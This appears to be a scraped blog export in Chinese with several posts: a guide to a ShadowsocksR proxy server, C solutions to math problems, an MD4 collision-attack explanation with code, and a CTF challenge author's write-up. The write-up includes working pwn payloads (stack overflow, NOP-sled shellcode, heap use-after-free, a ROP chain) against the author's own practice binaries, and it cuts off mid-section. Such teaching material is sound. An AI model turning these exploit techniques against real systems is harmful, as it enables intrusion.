服务器端由于酸酸乳的大名早有耳闻，结合我校一位大佬的这篇文章中给出的方法，就可以搭建好服务器端。我甚至没有使用GitHub提供的学生优惠码，因为我一注册DO（为此我甚至注册了PayPal）就送了60天有效的$100（这是因为DO有邀请注册的机制，比如点这里注册同样能获得$100）。我现在正发愁怎么用掉它…… 期间注册时支付的$5第二天才到账，可能PayPal是会慢一点？ 因为我的蜜汁自信，建服务器的时候随手加了SSH key，导致我一开始都不能用用户名和密码登录服务器。在详细的官网文档的帮助下解决了问题，实际上即使在Windows环境下，PuTTY也不是必须安装的，可以用bash下更方便的openssh来连接。之后也可以生成SSH密钥部署好以后通过SSH登录。 花了一些时间的是远程登陆时提示Permission denied (publickey,gssapi-keyex,gssapi-with-mic)的问题。原因有很多，网上的解决方案也各不相同，最后还是在靠谱的StackOverFlow上找到了适合我的情况：将/etc/ssh/sshd_config里的PasswordAuthentication设为yes，随后重启sshd服务。 费用上，最低配置的VPS需要$5/月，可以接受。由于有注册的$5+送的$100（虽然就两个月）+GitHub学生包的$60+邀请用户机制，至少可以免费用一年多。如果可以邀请到同学注册/拉同学一起施展魔法/拿同学的邮箱注册学生包的话，免费使用的期限就更长了。所以这个方法还是相当稳定持久的。 客户端客户端配置就容易多了，下载好酸酸乳，填好配置信息其实就能用了。不过一般都会设置系统代理模式为PAC模式，使得魔法仅仅在需要的时候施展，优化上网体验。 然而一部分网站（别问，问就是不知道）在PAC模式下无法访问或者访问时出现异常，这时我们还是需要开启全局模式。这样不断调整酸酸乳的设置比较麻烦，于是Chrome插件SwitchyOmega/Firefox插件AutoProxy允许我们列一个名单，在访问名单内的网址时自动切换至全局模式，访问其它网址则切回PAC模式。 当然酸酸乳好像本来也可以编辑PAC列表的。这两个插件提供的最主要的功能在于“自动切换情景模式”。详细配置方法这里不过多赘述了。 TO-DO最近学校又封网了，由于我尚且不清楚的原因，用学校提供的Cisco AnyConnect访问学校内网时，我的魔法出了些问题。原因是什么？能不能让两者共存呢？留坑（2019.03.13更新：已填）。 附录酸酸乳的工作原理居然异常简单。类似SSH隧道，在客户端代理和VPS之间进行加密通讯来避免流量特征分析，而VPS和要访问的网站之间的通讯是畅通的。而这个工具的名字来源于它所基于的5只袜子SOCKS5协议（绑定端口1080）。幸好计网有认真学，没见过的协议也能举一反三大概明白一点。 最后希望这篇文章不要消失。 2019.03.09更新使用时发现速度较慢，于是在服务器端配置了BBR加速。这个由Google推出的TCP拥塞控制协议简直就是黑魔法（要求Linux内核4.9以上），不仅安装简单而且对速度的提升肉眼可见。 顺便参考酸酸乳的一篇文档调整了酸酸乳的混淆策略，加密算法、协议和混淆算法采用了none + auth_chain_a + tls1.2_ticket_auth的组合，大概是更鲁棒了吧。 2019.03.13更新今天酸酸乳不知道为什么爆炸了，尝试多种方法无果。IP地址+端口号能ping通，服务也重启了几次，VPS本身和浏览器的SwitchOmega并没有什么问题，酸酸乳在两端的配置也没问题，真是奇怪啊。最后通过该端口号解决了，原因不明。 顺便捣鼓了一下SwitchyOmega的配置，对于学校网站用直接相连模式就好了，这样同时开学校的Anyconnect和酸酸乳完全没有问题。 auto switch是真的好用。","link":"/post/MagicalSurfing/"},{"title":"数学问题合集","text":"总是让人头疼又令人着迷的数学问题。 求 n！首位数使用斯特林公式得到近似结果： $$\\lim_{n\\to+\\infty} {n!\\over{\\sqrt {2 \\pi n}} ({n\\over e})^n} = 1$$ 之后用 10 的幂计算取首位即可，注意数字较小时特判，代码如下： 1234567891011121314151617181920212223242526#include &lt;stdio.h&gt;#include &lt;math.h&gt;const double PI = 3.14159265358979;const double E = 2.718281828;int main(){ int n,fn; double log_n_fac; while (scanf(&quot;%d&quot;, &amp;n) != EOF){ log_n_fac = 0.5 * log10(2 * PI *(double)n) + (double)n * log10((double)n / E); log_n_fac -=(int)log_n_fac; fn = pow(10, log_n_fac);//Stirling's approximation switch(n){ case 0:printf(&quot;1\\n&quot;);break; case 1:printf(&quot;1\\n&quot;);break; case 2:printf(&quot;2\\n&quot;);break; case 3:printf(&quot;6\\n&quot;);break; case 7:printf(&quot;5\\n&quot;);break; case 8:printf(&quot;4\\n&quot;);break; default:printf(&quot;%d\\n&quot;, fn); } } return 0;} 求 n^n 首位方法类似，代码： 12345678910111213#include &lt;stdio.h&gt;#include &lt;math.h&gt;int main(){ int n; scanf(&quot;%d&quot;,&amp;n); while(n != 0){ printf(&quot;%d\\n&quot;,(int)pow(10,n*log10(n)-(int)(n*log10(n)))); scanf(&quot;%d&quot;,&amp;n); } return 0;} 整数质因子分解从小到大枚举因数，如果这个因数不是素数（如 15），那么之前枚举过的素数已经消耗掉了这个因数（如 3 和 5），因此n%15不会为 0。所以这题并不需要筛选素数。 123456789101112131415161718192021222324252627282930#include &lt;stdio.h&gt;int n;void solve(){ int i; int m = n; for (i = 2; i &lt;= n; i++){ int cnt = 0; if (m % i) continue; while (m % i == 0){ m /= i; cnt++; } printf(&quot;(%d,%d)&quot;, i, cnt); if (m == 1) break; } printf(&quot;\\n&quot;);}int main(void){ int t,i; scanf(&quot;%d&quot;, &amp;t); for (i = 0; i &lt; t; i++){ scanf(&quot;%d&quot;, &amp;n); solve(); } return 0;} n！右端的 0 的个数令 n! = $5^m 2 ^p x$， m, p, x 为非负整数。同时由于 n!中 2 的倍数远多于 5 的倍数，即p &gt; m，所以 m 即为答案。要得到 m，首先找从 1 到 n 中 5 的倍数，即n / 5，而 25=$5^2$，一个数就含有两个 5 在内，因此第二轮我们找从 1 到n / 5中 5 的倍数。由于第一轮中已经被拿掉了一个 5，第二轮 25 就只需再拿出一个 5 即可，n / 25。第三轮则n / 125，第 i 轮${n \\over 5^i}$，以此类推： 1234567891011121314151617#include &lt;stdio.h&gt;int main(){ int t,i,n,m,z; scanf(&quot;%d&quot;, &amp;t); for (i = 0; i &lt; t; i++){ scanf(&quot;%d&quot;, &amp;n); m = 5;z = 0; while (n &gt;= m){ z += n / m; m *= 5; } printf(&quot;case #%d:\\n%d\\n&quot;, i, z); } return 0;}","link":"/post/MathProblems/"},{"title":"MD4碰撞攻击","text":"重复了王小云教授 14 年前的工作，RIPEMD/MD5/SHA 家族碰撞原理类似。 课程《Hash 函数安全性分析》要求我们基于王小云教授在 2005 年欧密会上发表的Cryptanalysis of the Hash Functions MD4 and RIPEMD，实现对 MD4 函数的碰撞攻击。所谓MD4 函数，就是大名鼎鼎的 MD5 函数的前身，后者相较于前者更为安全（尽管也同样被王小云教授找到了碰撞攻击的方法）。值得一提的是，MD4 和 MD5 的发明者是 Ronald Rivest，也就是 RSA 中的‘R’。 本文可以看作是对这篇著名论文的中文概述，其中混杂了一些个人在构筑代码时的简略思路。 MD4 算法介绍MD4 是将任意长度的消息压缩为 128bit 的一种单向散列函数。MD4 先将消息填充至其长度为 512bit 的整数倍（即使消息原长已经是 512bit 的整数倍），随后将填充后的消息压缩至 128bit。由于填充消息的方法与 MD4 碰撞无关，这里不再赘述，我们只关注压缩消息的方法。 为了阐释 MD4 压缩函数的步骤，首先定义三个函数： \\begin{align} & F(X,Y,Z) = (X\\land Y)\\lor (\\lnot X\\land Z)\\\\ & G(X,Y,Z) = (X\\land Y)\\lor (X\\land Z)\\lor (Y\\land Z)\\\\ & H(X,Y,Z) = X\\oplus Y\\oplus Z \\end{align} 其中 X,Y,Z 都是 32bit 的字（注意到在 C++中，unsigned int可以很好地表示它们）。压缩函数共 3 轮，每轮有 16 步操作，每次操作都会更新链接变量a,b,c,d 之一。更新时需要用到这三个函数： \\begin{align} & \\phi_0(a,b,c,d,m_k,s) = ((a + F(b,c,d) + m_k)\\ mod\\ 2^{32})\\lll s\\\\ & \\phi_1(a,b,c,d,m_k,s) = ((a + G(b,c,d) + m_k + 0x5a827999)\\ mod\\ 2^{32})\\lll s\\\\ & \\phi_2(a,b,c,d,m_k,s) = ((a + H(b,c,d) + m_k + 0x6ed9eba1)\\ mod\\ 2^{32})\\lll s\\\\ \\end{align} 而 a,b,c,d 的初始值定义为： (a,b,c,d) = (0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476) 这里的 4 个 16 进制数，以及上面$\\phi_1$和$\\phi_2$式中的 2 个 16 进制数，都是可以任意选取的。 MD4 压缩函数记填充后的消息为$\\bar{M}$，对$\\bar{M}$中的任一 512bit 块$M$，将其划分为 16 个 32bit 字$(m_0, m_1, …, m_{15})$。同时，定义$(aa,bb,cc,dd)$为链接变量，也就是上一消息块经过压缩后的输出，或者说压缩本消息块所用到的输入。在第一轮，链接变量的值就是上述 a,b,c,d 的初始值。 压缩函数的主体是三轮，或者说 48 步运算： $$ For\\ j = 0,1,2\\ and\\ i = 0,1,2,3\\\\ \\begin{align} & a = \\phi_j(a,b,c,d,w_{j,4i},s_{j,4i})\\\\ & d = \\phi_j(d,a,b,c,w_{j,4i+1},s_{j,4i+1})\\\\ & c = \\phi_j(c,d,a,b,w_{j,4i+2},s_{j,4i+2})\\\\ & b = \\phi_j(b,c,d,a,w_{j,4i+3},s_{j,4i+3})\\\\ \\end{align} $$ 这里的 w 是消息字，s 是循环左移的位数。压缩函数的最后一步意外简单，将计算得到的链接变量 a,b,c,d加到输入的链接变量 aa,bb,cc,dd上： \\begin{align} & aa = (a + aa)\\ mod\\ 2^{32}\\\\ & bb = (b + bb)\\ mod\\ 2^{32}\\\\ & cc = (c + cc)\\ mod\\ 2^{32}\\\\ & dd = (d + dd)\\ mod\\ 2^{32}\\\\ \\end{align} 如果这里的$M$是最后一个消息块，那么$H(\\bar{M}) = aa|bb|cc|dd$，否则用$(aa,bb,cc,dd)$作为下一个消息块的输入链接变量。 注意到这里的四个表达式和上面的三个$\\phi$系列表达式都含有$mod\\ 2^{32}$这个特殊的模运算。从 01 串的角度看，这个运算相当于截取该串的低 32 位。而由上述分析我们已知，参与运算的 a,b,c,d、F/G/H 函数的输出、以及$m_k$都是 32bit 的 01 串，或者说unsigned int。这构成了一个美妙的巧合，那就是：在利用unsigned int进行四则运算时默认自动丢弃溢出的位，而这与$mod\\ 2^{32}$的效果完全一致！ 当然，实际上这并不是巧合。 引理与记号下面给出的定理都只涉及位运算，逻辑十分简单，却是后面推导充分条件的关键所在。 F 函数引理 \\begin{align} & F(x,y,z) = F(\\lnot x,y,z)\\ iff\\ y=z\\\\ & F(x,y,z) = F(x,\\lnot y,z)\\ iff\\ x=0\\\\ & F(x,y,z) = F(x,y,\\lnot z)\\ iff\\ x=1\\\\ \\end{align} G 函数引理 \\begin{align} & G(x,y,z) = G(\\lnot x,y,z)\\ iff\\ y=z\\\\ & G(x,y,z) = G(x,\\lnot y,z)\\ iff\\ x=z\\\\ & G(x,y,z) = G(x,y,\\lnot z)\\ iff\\ x=y\\\\ \\end{align} H 函数引理 \\begin{align} & H(x,y,z) = \\lnot H(\\lnot x,y,z) = \\lnot H(x,\\lnot y,z) = \\lnot H(x,y,\\lnot z)\\\\ & H(x,y,z) = H(\\lnot x,\\lnot y,z) = H(x,\\lnot y,\\lnot z) = H(\\lnot x,y,\\lnot z)\\\\ \\end{align} 记号下文中只有一个记号是不怎么常见的，那就是$x_i[\\pm j_1,\\pm j_2,…,\\pm j_l]$，它表示改变$x_i$的第$j_1,j_2,…,j_l$位后得到的 01 串。正号表示将该位从 0 变成 1，负号相反。 等价转换方法在原文中，为了说明这种方法作者举了一个简单的例子，对于： $$\\Delta c_2 = c_2’ - c_2 = -2^{18} + 2^{21}$$ 用刚才的记号表示，就是$c_2’ = c_2[-19,22]$。在一些特定的差分路径上需要将其中的单 bit 差分扩展成多 bit 差分，这就需要一种等价转换方法。显然这里$-2^{18}=2^{18}+2^{19}-2^{20}$，也就是说$c_2[-19] = c_2[19,20,-21]$。综上： $$c_2’ = c_2[19,20,-21,22]$$ MD4 碰撞攻击攻击分为三步： 构造一对差分 M 与 M’ 由此生成充分条件 对随机消息 M 进行修改来尽可能满足之前的充分条件 差分构造与充分条件推导构造 M 与 M’，使得： $$ \\Delta M = M' - M = (\\Delta m_0, \\Delta m_1, ..., \\Delta m_{15})\\\\ \\Delta m_1 = 2^{31},\\ \\ \\Delta m_2 = 2^{31}-2^{28},\\ \\ \\Delta m_{12} = -2^{16}\\\\ \\Delta m_i = 0,\\ \\ 0\\le i\\le 15,\\ \\ i\\ne 1,2,12 $$ 接下来就是寻找碰撞差分，并根据 F/G/H 函数的上述引理，生成使得差分性质能够被满足的一系列充分条件。只需要尽可能保证这些充分条件成立，即可大幅提高产生碰撞的概率。在论文中，作者在表 5 中给出了碰撞差分的特征，在表 6 中给出了所有充分条件，由于表格较长这里不再搬运。 作者举了一个详细的例子来说明，我们如何生成这样的充分条件。 对于如下变换（表 5 中的第 9 步）： $$ (b_2[-13,-14,15], c_2[19,20,-21,-22], d_2[14], a_2)\\\\ \\to (a_3[17], b_2[-13,-14,15], c_2[19,20,-21,22], d_2[14]) $$ 我们已经知道： $$a_3 = ((a_2 + F(b_2, c_2, d_2) + m_8)\\ mod\\ 2^{32}) \\lll 3$$ 由F 函数引理 1，为了让$b_2$第 13 位和 15 位上的变化不影响$a_3$，我们可以令$c_2$和$d_2$在第 13 和 15 位上相等。 由F 函数引理 2，为了让$c_3$第 19-22 位上的变化不影响$a_3$，我们可以令$b_2$第 19-22 位全部为 0。 由 F 函数性质，构造$b_{2,14}=1, d_{2,14}=0, c_{2,14}=0$，这样当$b_2$和$d_2$的第 14 位分别由 1 变 0 和由 0 变 1 时（$c_2$不变），F 函数返回值就会由 0 变 1。也就是说，$F(b_{2,14}, c_{2,14}, d_{2,14}) = 0, F(\\lnot b_{2,14}, c_{2,14}, \\lnot d_{2,14}) = 1$，再把相应的 i、j 和移位（根据表 5，第 9 步的移位为 3）代入压缩函数的第一个表达式中，就可以得到$\\Delta a_3 = 2^{16}$。 我们最后令$a_3$第 17 位为 0，就可以得到$a_3’ = a_3[17]$。 于是上述 10 个条件足够保证第 9 步的差分性质成立，也就是说这 10 个条件是第 9 步的充分条件。其余每步的充分条件的推导都类似。 消息修改如果没有消息修改，要让 M 与 M’碰撞只有$2^{-122}$，还远远不如生日攻击的$2^{64}$，因此作者提出通过消息修改来尽可能多满足一些充分条件，提升碰撞概率。 多步消息修改的本质在于利用单步消息修改，满足尽可能多的充分条件而不破坏已满足的那些条件。因此其原理与单步消息修改相同，这里不作过多赘述。值得一提的是，多步消息修改可以将碰撞概率提升到$2^{-6}$ ~ $2^{-2}$，只需要至多$2^8$次 MD4 运算，考虑到 MD4 运算中，填充耗时可忽略，计算时一共只有 48 轮$\\phi$函数运算，且$\\phi$函数中只用到了位运算与加法运算，该算法找到一对 MD4 碰撞的消息所需要的时间只需用秒来计算。 而单步消息修改的原理是十分简单的：对于任意一个变量$x$，如果我们希望令$x$的第$i$位为 0，只需要将$x$与$y$异或一下，其中$y$的第$i$位与$x$的第$i$位相同，其余位都为 0。这是由非常简单又非常经典的异或的性质告诉我们的。如果我们希望令$x$的第$i$位为 1，或者希望令$x$和$z$的第$i$位相等，那么原理是相同的。 作者给的例子是关于$m_1$的修改： $$ d_1\\gets d_1\\oplus (d_{1,7} \\lll 6)\\oplus ((d_{1,8}\\oplus a_{1,8})\\lll 7)\\oplus ((d_{1,11}\\oplus a_{1,11})\\lll 10) \\\\ m_1\\gets (d_1\\ggg 7) - d_0 - F(a_1, b_0, c_0) $$ 注意此处的$d_{1,7}$指的是：最低位为$d_1$的第 7 位，前 31 位全为 0 的串，也因此需要左移 6 位（似乎不需要循环左移？）。 经过单步消息修改后，碰撞概率提升到了约$2^{-25}$，这个概率看起来很小，但是经过测试，我发现只需要$2^{24}$ ~ $2^{27}$次 MD4 运算，也就是 4-8 分钟左右就可以找到 MD4 碰撞，不算太慢？尽管如此，多步消息修改在 RIPEMD 和 MD5 的碰撞攻击中的作用，就举足轻重了。 代码实现我觉得 C++应该会快一点于是用了 C++实现。首先是要定义好数据结构。 其余数据结构，比如存储移位量的数组、存储消息 M 与 M’的数组都很容易定义，然而表 6 中的充分条件存储起来却让人很头疼。几经修改后，我采用了如下方式： 1234567...// Following: {x=0, x=1, x==y}{{}, {}, {7}}, // a1{{7}, {}, {8, 11}}, // d1{{11}, {7, 8}, {26}}, // c1{{8, 11, 26}, {7}, {}}, // b1... 对照表 6 应该很好理解。 利用unsigned类型存所有链变量和消息块（原因上面已经写了），定义好 FGH 函数，以及循环移位、取特定位等辅助函数，接下来就是实现核心功能了： 12345678910111213141516class Msg {public: Msg() {data = vec_u(16);} explicit Msg(const vec_u &amp;_data) {data = _data;} vec_u data; static unsigned modify(const int &amp;i); vec_u md4(); void print_val(const char name[], int length);private: void round1(); void round2(); void round3();}; 三轮压缩函数很简单，比较难的是消息修改： 123456789101112131415unsigned Msg::modify(const int &amp;i) { unsigned m = e(); chain_var[i] = l_rotate(chain_var[i-4] + F(chain_var[i-1], chain_var[i-2], chain_var[i-3]) + m, shift[i%4]); for (int j = 0; suf_cond[i][0][j]; ++j) chain_var[i] ^= bit(chain_var[i], suf_cond[i][0][j]); for (int j = 0; suf_cond[i][1][j]; ++j) chain_var[i] ^= bit(~chain_var[i], suf_cond[i][1][j]); for (int j = 0; suf_cond[i][2][j]; ++j) chain_var[i] ^= bit(chain_var[i], suf_cond[i][2][j]) ^ bit(chain_var[i-1], suf_cond[i][2][j]); m = r_rotate(chain_var[i], shift[i%4]) - chain_var[i-4] - F(chain_var[i-1], chain_var[i-2], chain_var[i-3]); return m;} 最后在主函数中调用修改： 12345678for (int i = 4; i &lt; 20; ++i) m.data[i-4] = m_.data[i-4] = Msg::modify(i);// Construct differentialm_.data[1] += (1&lt;&lt;31);m_.data[2] += (1&lt;&lt;31);m_.data[2] -= (1&lt;&lt;28);m_.data[12] -= (1&lt;&lt;16); 这里仅给出了核心代码，不过理解了核心代码，其余细节也迎刃而解了。总的来说，理解这篇论文还是颇有难度的，从理解原理到代码实现也仍有很长一段距离。","link":"/post/MD4Collision/"},{"title":"MetasequoiaCTF2020 部分题解","text":"第一次出题，经验不足，感谢参赛选手海涵。 这次给队内新人赛出题，题目设置得比较简单，共有： Web * 5 Pwn * 5 Misc * 4 Crypto * 3 Reverse * 3 我负责出 Pwn 和 Reverse、Crypto 的签到题、以及两题 Web。这里就写下我负责出的题的 wp。 CryptoRidicule首先是没有绕任何弯的 RSA 共模攻击。题目描述说同一条消息发送了两次，可以很容易想到这个方法。原理详见CTF Wiki。 这里给出加密和解密的脚本： 123456789101112131415161718192021222324252627282930313233343536from Crypto.Util import numberfrom gmpy2 import *# encn_length = 2048p = number.getPrime(n_length)q = number.getPrime(n_length)n = p*qprint(n)phi = (p-1)*(q-1)e1 = 65537e2 = 395327d1 = invert(e1,phi)d2 = invert(e2,phi)#flag = b'flag{rS4_c0mOon_MOdu1u5_a7k}'flag = b'7=28LC$c04_&gt;~@?0|~5F`Fd02f&lt;N'flag = number.bytes_to_long(flag)c1 = powmod(flag,e1,n)c2 = powmod(flag,e2,n)print(c1)print(c2)# decdef exgcd(a,b): if b==0: return 1, 0, a x2, y2, r = exgcd(b, a%b) x1 = y2 y1 = x2-(a//b)*y2 return x1, y1, rs1,s2,t = exgcd(e1,e2)m = powmod(c1,s1,n) * powmod(c2,s2,n) % nprint(number.long_to_bytes(m)) 在解密后得到了： 17=28LC$c04_&gt;~@?0|~5F`Fd02f&lt;N 观察密文的字符集，不难发现是 ROT47 加密，再 ROT47 一次即解密得到了 flag。 Reverse我并不是很会出逆向，但是队伍里有同学需要做，于是这些题目基本都是有原题的。 CMCSReverse 类签到题，虽然可以静态分析出答案，还是推荐动态调试。逆向可以发现关键函数sub_8048708和sub_8048658，分析前者可知eax存储sub_8048658返回的 flag 值，因此在后者下断点调试，打印eax值即得到 flag。 1234b *0x8048658rfinx/16sw $eax Babysmali题目给了smali.jar以及src.smali，我们先将后者汇编成dex文件。 1java -jar smali.jar assemble src.smali -o src.dex 然后使用 jadx 反编译dex文件： 12345678910111213141516171819202122232425262728293031323334353637383940package com.example.hellosmali.hellosmali;public class Digest { public static boolean check(String input) { String str = &quot;+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;; if (input == null || input.length() == 0) { return false; } int i; char[] charinput = input.toCharArray(); StringBuilder v2 = new StringBuilder(); for (char toBinaryString : charinput) { String intinput = Integer.toBinaryString(toBinaryString); while (intinput.length() &lt; 8) { intinput = &quot;0&quot; + intinput; } v2.append(intinput); } while (v2.length() % 6 != 0) { v2.append(&quot;0&quot;); } String v1 = String.valueOf(v2); char[] v4 = new char[(v1.length() / 6)]; for (i = 0; i &lt; v4.length; i++) { int v6 = Integer.parseInt(v1.substring(0, 6), 2); v1 = v1.substring(6); v4[i] = str.charAt(v6); } StringBuilder v3 = new StringBuilder(String.valueOf(v4)); if (input.length() % 3 == 1) { v3.append(&quot;!?&quot;); } else if (input.length() % 3 == 2) { v3.append(&quot;!&quot;); } if (String.valueOf(v3).equals(&quot;xsZDluYYreJDyrpDpucZCo!?&quot;)) { return true; } return false; }} 从字符集可以看出和 Base64 编码有关，实际上只是它的一个变种。既可以用 python 解，也可以用 java 解，python 版： 123456789101112131415161718192021222324252627282930313233343536import stringbase64_charset = '+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'def decode(base64_str): &quot;&quot;&quot; 解码base64字符串 :param base64_str:base64字符串 :return:解码后的bytearray；若入参不是合法base64字符串，返回空bytearray &quot;&quot;&quot; # 对每一个base64字符取下标索引，并转换为6为二进制字符串 base64_bytes = ['{:0&gt;6}'.format(str(bin(base64_charset.index(s))).replace('0b', '')) for s in base64_str if s != '='] resp = bytearray() nums = len(base64_bytes) // 4 remain = len(base64_bytes) % 4 integral_part = base64_bytes[0:4 * nums] while integral_part: # 取4个6位base64字符，作为3个字节 tmp_unit = ''.join(integral_part[0:4]) tmp_unit = [int(tmp_unit[x: x + 8], 2) for x in [0, 8, 16]] for i in tmp_unit: resp.append(i) integral_part = integral_part[4:] if remain: remain_part = ''.join(base64_bytes[nums * 4:]) tmp_unit = [int(remain_part[i * 8:(i + 1) * 8], 2) for i in range(remain - 1)] for i in tmp_unit: resp.append(i) return respif __name__==&quot;__main__&quot;: print decode('A0NDlKJLv0hTA1lDAuZRgo==') java 版： 1234567891011121314151617181920212223242526272829303132333435public class XMan { public static void main(String[] args) { String v6 = &quot;+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;; String s = &quot;xsZDluYYreJDyrpDpucZCo&quot;; StringBuilder sb = new StringBuilder(); for (int i = 0; i &lt; s.length(); i++) { int tmp = v6.indexOf(s.charAt(i)); String ss = Integer.toBinaryString(tmp); if (ss.length() == 5) { ss = &quot;0&quot; + ss; } else if (ss.length() == 4) { ss = &quot;00&quot; + ss; } else if (ss.length() == 3) { ss = &quot;000&quot; + ss; } else if (ss.length() == 2) { ss = &quot;0000&quot; + ss; } else if (ss.length() == 1) { ss = &quot;00000&quot; + ss; } else if (ss.length() == 0) { ss = &quot;000000&quot; + ss; } sb.append(ss); } String x = sb.toString() + &quot;0000&quot;; StringBuilder stringBuilder = new StringBuilder(); for (int i = 0; i &lt; x.length(); i += 8) { String tmp = x.substring(i, i + 8); byte b = (byte) Integer.parseInt(tmp, 2); stringBuilder.append((char) b); } System.out.println(stringBuilder.toString()); }} Prison这是一道纯迷宫题，只是工作量有点大。参考 WP。 Pwn所有题目均为 64 位程序，libc 版本 2.23。 BlacksmithPwn 类签到题。本题的输出让这题看上去像堆题，但实际上只有第一个锻造剑的功能是有实际作用的。可以看到在给剑命名时，首先要输入名字长度，如果长度超过0x40则失败。但是注意到名字长度这个变量是无符号的，因此可以整数溢出：输入-1，则可输入0xffffffffffffffff字符，绕过了这个判断。 随后就可以栈溢出了，程序中存在后门函数，直接ret2text。 1234sla('&gt; ','1')sla('name?\\n','-1')payload = flat('a'*0x48,0x4007d6)sla('is?\\n',payload) Snow Mountain这题关闭了 NX 保护，说明需要布置 shellcode，难点在于找到 shellcode 位置。程序首先给出一个栈上的随机地址，并且栈上存在一个0x1000的字符数组。根据题目提示”滑雪”、”雪橇”等，容易想到利用 nop sled 滑到 shellcode 的位置来增加容错率。想到 nop sled 的话这题就做完了。 1234567ru('position: 0x')cur = int(ru('\\n'),16)leak('cur',cur)payload = asm(shellcraft.sh())payload = payload.rjust(0x1000-1,'\\x90')sla('&gt; ',payload)sla('&gt; ',hex(cur)) Summoner本次比赛唯二的堆题，但是极其简单。邪恶召唤师召唤了一只 5 级生物，但是你只能召唤四级生物，你的目的就是修改生物的等级为 5 级。 题目提供了几种命令： 展示召唤物信息 召唤一只生物，并给它起名字 设置生物的等级，但必须小于 5 攻击敌方召唤物 释放召唤物 我们通过逆向可以得知，召唤物的结构体长这样： 1234struct creature { char *name; int level;}; 随后可以发现两处漏洞： 召唤时，输入的name使用strdup函数（隐式调用了malloc），但并没有检查长度，因此可以溢出到下一个 8 字节处。 在释放召唤物时，只会调用free(c-&gt;name)，然后将结构体指针置空，但并不会释放结构体指针本身。 因此我们尝试先召唤一个名为aaaaaaaa\\x05的生物，此时堆结构如下： 12345678910111213pwndbg&gt; heapls ADDR SIZE STATUSsbrk_base 0x56476bb24000chunk 0x56476bb24000 0x1010 (inuse)chunk 0x56476bb25010 0x20 (inuse)chunk 0x56476bb25030 0x20 (inuse)chunk 0x56476bb25050 0x20fb0 (top)sbrk_end 0x56476bb46000pwndbg&gt; x/8gx 0x56476bb250100x56476bb25010: 0x0000000000000000 0x00000000000000210x56476bb25020: 0x000056476bb25040 0x00000000000000000x56476bb25030: 0x0000000000000000 0x00000000000000210x56476bb25040: 0x6161616161616161 0x0000000000000005 可以看到有 2 块 0x20 的 chunk，第一块是结构体指针，存放着name地址和level数值；第二块就是name了，存放着我们输入的name，注意这时第二个 8 字节已经是 5 了。随后我们释放召唤物： 12345pwndbg&gt; x/8gx 0x5621c569e0100x5621c569e010: 0x0000000000000000 0x00000000000000210x5621c569e020: 0x00005621c569e040 0x00000000000000000x5621c569e030: 0x0000000000000000 0x00000000000000210x5621c569e040: 0x0000000000000000 0x0000000000000005 这时name被free了但指针还在，我们刚刚写的\\x05也还在。这时再召唤就能得到0x5621c569e030处的一块 chunk 作为结构体指针，而新的name跑到了0x55feced35050： 1234567pwndbg&gt; x/12gx 0x55feced350100x55feced35010: 0x0000000000000000 0x00000000000000210x55feced35020: 0x000055feced35040 0x00000000000000000x55feced35030: 0x0000000000000000 0x00000000000000210x55feced35040: 0x000055feced35060 0x00000000000000050x55feced35050: 0x0000000000000000 0x00000000000000210x55feced35060: 0x0000000000000061 0x0000000000000000 于是此时，结构体指针里的level就变成了 5。 1234sla('&gt; ','summon aaaaaaaa'+'\\x05')sla('&gt; ','release')sla('&gt; ','summon a')sla('&gt; ','strike') Demon Dragon题目本身不难，略微有些工作量。 首先是逆向程序，一开始会调用 6 个函数，这 6 个函数来自题目同时给出的libmagic.so，目的是为了让这 6 个函数被动态链接进来，可以直接忽略。随后，Demon Dragon 会使用 5 种元素攻击你，元素的顺序是随机的。接下来需要输入使用的技能，这里存在简单的gets栈溢出。但是并不清楚溢出之后要干什么。 然后我们逆向libmagic.so，这个文件保留了符号表，因此可以看到刚才的 6 个函数，分别是 5 种元素护盾和一个check函数。观察后可以发现每种元素护盾都可以克制另一种元素（克制关系在题目描述里），当 5 种攻击都被克制后就可以通过check来拿到 flag。可以看到check里存在system(&quot;cat flag&quot;);，如果这个函数不是动态链接的，选手可以直接栈溢出跳到这里。此外，5 种护盾如果没有符号表则逆向难度较大，因此我把它们和check都编译成了动态链接库。 最后来看护盾如何调用：所有护盾都只需要函数参数等于特定值即可成功调用，区别仅仅是特定值与参数个数不同。那么如何控制参数呢？这是 64 位程序，我们需要控制前三个参数寄存器rdi,rsi,rdx。前两者在偏移过的__lib_csu_init中可以找到，比较通用： 12pop rdi; retpop rsi; pop r15; ret 而rdx不太好控制，于是我在程序中直接硬编码了一个 gadget： 1pop rdi; pop rsi; pop rdx; ret 这样就可以构造 rop 链了，按元素克制关系调用 5 种护盾，最后返回到check函数 getflag。不要忘了check函数也需要参数，这个参数可以参考第一次调用check时候的参数，位于0x6020b0。 1234567891011121314151617181920212223ru('with ')elem = [ru(', ') for i in range(4)]elem.append(ru('!\\n'))pop_rdi = 0x400e43 # 1pop_rsi = 0x400e41 # 2pop3 = 0x400c3a # 1,2,3strategy = { 'gold': flat(pop_rdi,0xdeadbabe,pop_rsi,0xdeadfa11,0,elf.plt['fire_shield']), 'wood': flat(pop_rdi,0xdeadbeef,elf.plt['gold_shield']), 'water': flat(pop_rdi,0xfee1dead,elf.plt['earth_shield']), 'fire': flat(pop3,0xbaaaaaad,0x8badf00d,0xd15ea5e,elf.plt['water_shield']), 'earth': flat(pop_rdi,0xcafebabe,pop_rsi,0xdeadbaad,0,elf.plt['wood_shield'])}payload = 'a'*0x48for attack in elem: payload += strategy[attack]pos = 0x6020b0payload += flat(pop_rdi,pos,elf.plt['check'])sla('Skill &gt; ',payload) 注意链接时libmagic.so的目录，我放在和源程序同一目录下因此使用选项-L.。同时/usr/lib/下也需要有libmagic.so。 此外，感谢 TaQini 师傅提供的非预期解：直接 ret2libc。 这么一说我才想起来，我原来确实是打算出 ret2libc 的，不知道怎么就改成了这个样子。 Samsara又一道堆题，应该是最难的 Pwn 题。 逆向可以知道每次抓人都执行malloc(8)，我们不能控制分配的大小。那么在释放的时候，chunk 必定进入 fastbin。操作 3 就是编辑 chunk 的内容，不存在溢出。但是这题有两个奇怪的操作：输入 4 会打印出栈上变量lair的位置，输入 5 会改变lair的值。最后，退出程序时，检查栈上变量target是否等于0xdeadbeef，如果等于就能 getflag，但是整个程序中不存在对target的任何读写操作。 漏洞点在于free之后没有置指针为 NULL，考虑double free。首先分配三个 